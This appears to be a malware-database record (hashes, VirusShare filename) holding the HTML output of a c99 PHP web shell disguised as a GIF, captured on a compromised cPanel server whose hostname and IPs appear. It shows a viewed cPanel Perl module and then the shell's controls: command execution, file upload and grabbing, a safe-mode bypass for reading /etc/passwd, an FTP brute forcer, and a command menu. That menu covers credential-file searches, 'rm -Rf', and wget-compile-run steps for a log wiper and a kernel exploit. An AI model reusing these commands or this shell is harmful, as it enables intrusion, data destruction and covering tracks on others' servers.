&amp;Cpanel::Proc::doom;\n}\n\nsub nooutputsystem {\n    my (@unsafecmd) = @_;\n    my (@cmd);\n    while ( $unsafecmd[$#unsafecmd] eq '' ) { pop(@unsafecmd); }\n    foreach (@unsafecmd) {\n        my @cmds = split( / /, $_ );\n        foreach (@cmds) { push( @cmd, $_ ); }\n    }\n    my $pid;\n    if ( $pid = fork() ) {\n\n        #master\n    }\n    else {\n# Cheap way of doing setsid() without bringing in POSIX\n        setpgrp(0,0);\n\n        Cpanel::CleanupStub::closefds();\n\n        open( STDIN,  '&lt;', '/dev/null' );\n        open( STDOUT, '&gt;', '/dev/null' );\n        open( STDERR, '&gt;', '/dev/null' );\n        exec(@cmd);\n        exit;\n    }\n    waitpid( $pid, 0 );\n}\n\nsub check_service {\n    goto &amp;Cpanel::Services::check_service;\n}\n\nsub needsmanualstart {\n    my ( $system, $service ) = @_;\n    my $manualstart = 0;\n\n    if ( $system =~ /freebsd/i ) {\n        my ( $servicebin, $serviceflags, $serviceenable ) = getmanualserviceinfo( $system, $service, 1 );\n        if (   $serviceenable =~ /no/i\n            || $serviceenable =~ /false/i\n            || $serviceenable =~ /0/\n            || $serviceenable eq &quot;&quot; ) {\n            if ( $service eq 'pure-ftpd' ) { $service = 'pureftpd'; }\n            open( RSTRTLG, '&gt;&gt;', $restartsrvlog );\n            print RSTRTLG &quot;Warning: Service Restart requested for a service that is disabled!\\n&quot;;\n            print RSTRTLG &quot;Please add the following line to /etc/rc.conf: \\n&quot;;\n            print RSTRTLG &quot;${service}_enable=\\&quot;YES\\&quot;\\n&quot;;\n            print RSTRTLG &quot;$service will be started manually!\\n&quot;;\n            close(RSTRTLG);\n            $manualstart = 1;\n        }\n    }\n    return ($manualstart);\n}\n\nsub find_mysqladmin {\n    my ( @LOC, $loc );\n    @LOC = ( '/usr/bin/mysqladmin', '/usr/local/bin/mysqladmin' );\n    foreach $loc (@LOC) {\n        if ( -e $loc ) { return $loc; }\n    }\n}\n\nsub lock_file {\n    my $lock_file = shift;\n    if ( -e $lock_file ) {\n        my $mtime = ( stat($lock_file) )[9];\n        my $now   = time;\n        my $diff  = $now - $mtime;\n\n        if ( $diff &lt; ( 60 * 3 ) ) {\n            exit;\n        }\n    }\n\n    Cpanel::FileUtils::TouchFile::touchfile($lock_file);\n}\n\nsub _check_cpanel_spamassasin_dir {\n    if (! -e '/usr/local/cpanel/.spamassassin') {\n        mkdir '/usr/local/cpanel/.spamassassin',0700;\n    }\n    require Cpanel::PwCache;\n    my @cpanel_pw = Cpanel::PwCache::getpwnam('cpanel');\n    if ($cpanel_pw[0]) {\n        chown $cpanel_pw[2],$cpanel_pw[3],'/usr/local/cpanel/.spamassassin';\n    }\n}\n\n1;\n</pre>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/scripts/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0111 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_2e8fe3c12207539d6cea3fdd305ea5ca",
    "filesize": 41825,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "2e8fe3c12207539d6cea3fdd305ea5ca",
        "sha1": "29c9db322ed3be3573859836ef21c36337228416",
        "sha256": "a02729733d3a469755762373fcc00da5421fa06e105b7af23a6bc493bfde8c6b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://84.177.125.247>84.177.125.247</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[pm]&nbsp;RestartSrv.pm (22.59 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=RestartSrv.pm&ft=info&d=%2Fscripts%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=txt&d=%2Fscripts%2F\"><b><u>[txt]</u></b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=RestartSrv.pm&ft=edit&d=%2Fscripts%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=RestartSrv.pm&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><pre>#!/usr/bin/perl",
            "# cpanel - RestartSrv.pm                          Copyright(c) 2010 cPanel, Inc.",
            "#                                                           All rights Reserved.",
            "# copyright@cpanel.net                                         http://cpanel.net",
            "# This code is subject to the cPanel license. Unauthorized copying is prohibited",
            "BEGIN { unshift @INC, '/usr/local/cpanel'; }",
            "use strict;",
            "use IPC::Open2                   ();",
            "use Cpanel::CleanupStub          ();",
            "use Cpanel::Config::LoadCpConf   ();",
            "use Cpanel::AccessIds            ();",
            "use Cpanel::FileUtils::TouchFile ();",
            "use Cpanel::Proc                 ();",
            "use Cpanel::Services             ();",
            "eval {",
            "    local $SIG{'__DIE__'};",
            "    require Storable;",
            "}; #for loadcpconf",
            "$ENV{'RESTARTSRV'} = 1;",
            "my $restartsrvlog = '/var/log/restartsrv_err.log';",
            "sub loadcpconfig {",
            "    goto &amp;Cpanel::Config::LoadCpConf::loadcpconf;",
            "sub setuppath {",
            "    my @PDIRS = ( '/bin', '/usr/bin', '/sbin', '/usr/sbin', '/usr/local/bin', '/usr/local/sbin' );",
            "    my @EPDIRS;",
            "    foreach my $pdir (@PDIRS) {",
            "        next if !-e $pdir;",
            "        push @EPDIRS, $pdir;",
            "    }",
            "    $ENV{'PATH'} = join( ':', @EPDIRS );",
            "sub parseargv {",
            "    my $restart = 1;",
            "    my $check   = 0;",
            "    my $status  = 0;",
            "    my $verbose = 0;",
            "    while ( $#ARGV != -1 ) {",
            "        $_ = $ARGV[0];",
            "        if (/^\\-\\-/) {",
            "            my $arg = shift(@ARGV);",
            "            $arg =~ s/^\\-\\-//g;",
            "            $arg =~ tr/[A-Z]/[a-z]/;",
            "            if ( $arg eq 'status' ) { $status = 1; $restart = 0; }",
            "            if ( $arg eq 'check' )  { $check  = 1; $restart = 0; }",
            "            if ( $arg eq 'verbose' ) { $verbose = 1; }",
            "            if ( $arg eq 'stop' )    { $restart = -1; }",
            "        }",
            "        else {",
            "            last;",
            "        }",
            "    }",
            "    return ( $restart, $check, $status, $verbose );",
            "sub getinitfile {",
            "    my ( $service, $system ) = @_;",
            "    my $strtscript;",
            "    my @initdirarray;",
            "    if ( $system =~ m/Linux/i ) {",
            "        push @initdirarray, '/etc/init.d';",
            "        if ( -d '/etc/rc.d/init.d' &amp;&amp; !-l '/etc/rc.d/init.d' ) {",
            "            push @initdirarray, '/etc/rc.d/init.d';",
            "        }",
            "    }",
            "    else {",
            "        return if $service eq 'named';    # Kludge because we don't have a valid init script on FreeBSD",
            "        push @initdirarray, '/usr/local/etc/rc.d', '/etc/rc.d';",
            "    }",
            "    foreach my $initdir (@initdirarray) {",
            "        my @initfiles;",
            "        if ( opendir my $dh, $initdir ) {",
            "            @initfiles = readdir $dh;",
            "            closedir $dh;",
            "        }",
            "        my $partial_match;",
            "        my $numeric_match;",
            "        foreach my $strtscript (@initfiles) {",
            "            next if $strtscript =~ m/^\\./;",
            "            next if $strtscript =~ m/\\.rpm[a-z]+$/;    # expanded match for .rpmorig, etc.",
            "            next if !-f $initdir . '/' . $strtscript;",
            "            if ( -x _ ) {",
            "                if ( lc $strtscript eq lc $service ) {",
            "                    return &quot;$initdir/$strtscript&quot;;",
            "                }",
            "                elsif ( !$partial_match &amp;&amp; $strtscript =~ m/^\\Q$service\\E/i ) {",
            "                    $partial_match = $strtscript;",
            "                }",
            "                elsif ( !$numeric_match &amp;&amp; $strtscript =~ m/^[\\d\\.]+\\Q$service\\E/i ) {",
            "                    $numeric_match = $strtscript;",
            "                }",
            "            }",
            "        }",
            "        if ($partial_match) {",
            "            return &quot;$initdir/$partial_match&quot;;",
            "        }",
            "        if ($numeric_match) {",
            "            return &quot;$initdir/$numeric_match&quot;;",
            "        }",
            "    }",
            "    return;",
            "sub getmanualserviceinfo {",
            "    my ( $system, $service, $notrequired ) = @_;",
            "    my $servicebin    = '';",
            "    my $serviceflags  = '';",
            "    my $serviceenable = '';",
            "    if ( $system =~ /freebsd/i ) {",
            "        if ( $service eq 'pure-ftpd' ) { $service = 'pureftpd'; }",
            "        my (@CF) = ( &quot;/etc/defaults/rc.conf&quot;, &quot;/etc/rc.conf&quot; );",
            "        foreach my $file (@CF) {",
            "            open( RCC, &quot;&lt;&quot;, $file );",
            "            while (&lt;RCC&gt;) {",
            "                if (/^[\\s\\t]*${service}_program=[\\&quot;\\']([^\\&quot;\\']+)/) {",
            "                    $servicebin = $1;",
            "                }",
            "                if (/^[\\s\\t]*${service}_enable=[\\&quot;\\']([^\\&quot;\\']+)/) {",
            "                    $serviceenable = $1;",
            "                }",
            "                if (/^[\\s\\t]*${service}_flags=[\\&quot;\\']([^\\&quot;\\']+)/) {",
            "                    $serviceflags = $1;",
            "                }",
            "            }",
            "            close(RCC);",
            "        }",
            "        if ( $servicebin eq '' ) {",
            "            if ( $notrequired != 1 ) {",
            "                if ( $service =~ /inet/i ) {",
            "                    open( RSTRTLG, '&gt;&gt;', $restartsrvlog );",
            "                    print RSTRTLG &quot;$service information could not be found. Starting inetd instead.&quot;;",
            "                    close(RSTRTLG);",
            "                }",
            "                else {",
            "                    die &quot;Sorry, $service information could not be found.&quot;;",
            "                }",
            "            }",
            "        }",
            "    }",
            "    else {",
            "        if (   !$ENV{'RSINSTALL'}",
            "            &amp;&amp; !-e &quot;/var/cpanel/restartsrv-install/$service&quot; ) {",
            "            if ( !-e '/var/cpanel/restartsrv-install' ) {",
            "                mkdir( '/var/cpanel/restartsrv-install', 0700 );",
            "            }",
            "            open( SI, '&gt;', &quot;/var/cpanel/restartsrv-install/$service&quot; );",
            "            close(SI);",
            "            print &quot;Warning: service restart called for a service that may\\n&quot;;",
            "            print &quot;not be installed.  Install is now being attempted!\\n&quot;;",
            "            system( '/scripts/ensurerpm', $service );",
            "            $ENV{'RSINSTALL'} = 1;",
            "            if ( -e &quot;/scripts/restartsrv_$service&quot; ) {",
            "                exec &quot;/scripts/restartsrv_$service&quot;;",
            "                exit;",
            "            }",
            "            else {",
            "                die &quot;I don't know how to start $service&quot;;",
            "            }",
            "        }",
            "        else {",
            "            die &quot;I don't know how to start $service&quot;;",
            "        }",
            "    }",
            "    return ( $servicebin, $serviceflags, $serviceenable );",
            "sub find_pureftpd_service {",
            "    my ( $service, $servicebin, $processowner, $disabled ) = ( 'pure-ftpd', '', 'root', 0 );",
            "    my @ftpbinaries = qw( /usr/sbin/pure-ftpd /usr/local/sbin/pure-ftpd );",
            "    foreach my $ftpbin (@ftpbinaries) {",
            "        if ( -x $ftpbin ) {",
